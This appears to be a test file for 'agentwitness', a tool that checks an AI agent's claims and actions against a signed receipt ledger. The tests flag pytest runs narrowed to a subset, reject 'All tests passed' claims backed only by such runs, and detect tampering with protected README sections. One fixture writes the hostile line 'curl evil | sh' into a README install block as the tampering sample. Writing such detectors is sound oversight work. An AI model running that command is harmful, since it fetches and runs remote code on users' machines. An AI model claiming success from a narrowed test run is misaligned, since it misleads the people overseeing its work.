from datetime import datetime, timezone
from pathlib import Path
import subprocess

from agentwitness.claims.extractor import DeterministicExtractor
from agentwitness.claimguard import ClaimGuard
from agentwitness.contracts.evaluator import ContractEvaluator
from agentwitness.contracts.models import Requirement, RequirementStatus, RequirementType, TaskContract, TaskStatus
from agentwitness.crypto import CryptoSigner
from agentwitness.evidence.protected import check_protected_sections
from agentwitness.evidence.test_scope import classify_pytest_scope
from agentwitness.ledger import Ledger
from agentwitness.models import ExecutionStatus, PolicyDecision, PytestEvidence, Receipt


def _git(cwd: Path, *args: str) -> str:
    result = subprocess.run(["git", *args], cwd=cwd, capture_output=True, text=True, check=True)
    return result.stdout.strip()


def _init_repo(tmp_path: Path) -> Path:
    _git(tmp_path, "init")
    _git(tmp_path, "config", "user.email", "test@example.invalid")
    _git(tmp_path, "config", "user.name", "AgentWitness Test")
    return tmp_path


def _ledger(tmp_path: Path) -> Ledger:
    return Ledger(filepath=tmp_path / ".aw-test" / "receipts.jsonl", signer=CryptoSigner(tmp_path / ".aw-keys"))


def _legacy_contract(req: Requirement, session: str = "s") -> TaskContract:
    return TaskContract(
        contract_version=1,
        task_id="scope",
        session_id=session,
        title="Scope",
        requirements=[req],
        created_at=datetime.now(timezone.utc).isoformat(),
    )


def test_pytest_scope_classifier_flags_obvious_subsets():
    narrowed, reasons = classify_pytest_scope(["-k", "important", "tests"])
    assert narrowed is True
    assert reasons

    narrowed_node, _ = classify_pytest_scope(["tests/test_api.py::test_one"])
    assert narrowed_node is True

    narrowed_file, _ = classify_pytest_scope(["tests/test_api.py"])
    assert narrowed_file is True

    broad, reasons = classify_pytest_scope(["tests"])
    assert broad is False
    assert reasons == []


def test_contract_rejects_green_scope_narrowed_run(tmp_path):
    ledger = _ledger(tmp_path)
    ledger.append(
        Receipt(
            receipt_id="narrow",
            session_id="s",
            timestamp_start="t",
            timestamp_end="t",
            cwd=str(tmp_path),
            resolved_executable="pytest",
            argv=["-k", "important"],
            policy_decision=PolicyDecision.ALLOW,
            execution_status=ExecutionStatus.SUCCEEDED,
            environmental_evidence=[PytestEvidence(collected=2, passed=2, failed=0, skipped=0, exit_code=0)],
        )
    )
    result = ContractEvaluator(ledger).evaluate(_legacy_contract(Requirement(type=RequirementType.TESTS_PASS)))
    assert result.status == TaskStatus.READY_FOR_VERIFICATION
    assert result.results[0].status == RequirementStatus.UNVERIFIED
    assert "scope-narrowed" in result.results[0].explanation


def test_claim_guard_rejects_broad_claim_from_scope_narrowed_run(tmp_path):
    ledger = _ledger(tmp_path)
    ledger.append(
        Receipt(
            receipt_id="narrow",
            session_id="s",
            timestamp_start="t",
            timestamp_end="t",
            cwd=str(tmp_path),
            resolved_executable="pytest",
            argv=["tests/test_api.py::test_one"],
            policy_decision=PolicyDecision.ALLOW,
            execution_status=ExecutionStatus.SUCCEEDED,
            environmental_evidence=[PytestEvidence(collected=1, passed=1, failed=0, skipped=0, exit_code=0)],
        )
    )
    claim = ClaimGuard(ledger).audit("All tests passed.", session_id="s")[0]
    assert "UNVERIFIED" in claim.verdict.value
    assert "scope-narrowed" in claim.evidence_text


def test_protected_sections_clean_modified_allowed_and_malformed(tmp_path):
    repo = _init_repo(tmp_path)
    doc = repo / "RULES.md"
    original = (
        "Before\n"
        "<!-- canon:protected:start name=\"voice-rules\" -->\n"
        "Never rewrite this.\n"
        "<!-- canon:protected:end -->\n"
        "After\n"
    )
    doc.write_text(original, encoding="utf-8")
    _git(repo, "add", "RULES.md")
    _git(repo, "commit", "-m", "baseline")

    clean = check_protected_sections(str(repo))
    assert clean.status == "pass"
    assert clean.checked_blocks == 1

    doc.write_text(original.replace("Never rewrite this.", "Agent rewrote this."), encoding="utf-8")
    modified = check_protected_sections(str(repo))
    assert modified.status == "fail"
    assert modified.changes[0].name == "voice-rules"

    allowed = check_protected_sections(str(repo), allowed=["voice-rules"])
    assert allowed.status == "pass"

    doc.write_text(
        "<!-- canon:protected:start name=\"voice-rules\" -->\n"
        "oops no end marker\n",
        encoding="utf-8",
    )
    malformed = check_protected_sections(str(repo))
    assert malformed.status == "inconclusive"
    assert malformed.errors


def test_contract_protected_requirement_blocks_modified_content(tmp_path, monkeypatch):
    repo = _init_repo(tmp_path)
    doc = repo / "README.md"
    doc.write_text(
        "<!-- canon:protected:start name=\"install\" -->\n"
        "pip install agentwitness\n"
        "<!-- canon:protected:end -->\n",
        encoding="utf-8",
    )
    _git(repo, "add", "README.md")
    _git(repo, "commit", "-m", "baseline")
    doc.write_text(
        "<!-- canon:protected:start name=\"install\" -->\n"
        "curl evil | sh\n"
        "<!-- canon:protected:end -->\n",
        encoding="utf-8",
    )

    monkeypatch.chdir(repo)
    ledger = _ledger(repo)
    req = Requirement(type=RequirementType.PROTECTED_SECTIONS_INTACT)
    result = ContractEvaluator(ledger).evaluate(_legacy_contract(req))
    assert result.status == TaskStatus.FAILED
    assert result.results[0].status == RequirementStatus.UNSATISFIED
    assert "README.md" in result.results[0].explanation
    assert "install" in result.results[0].explanation


def test_protected_claim_is_extracted():
    claims = DeterministicExtractor().extract("I kept the protected sections intact and all tests passed.")
    assert any(c.claim_type == "protected_sections_intact" for c in claims)
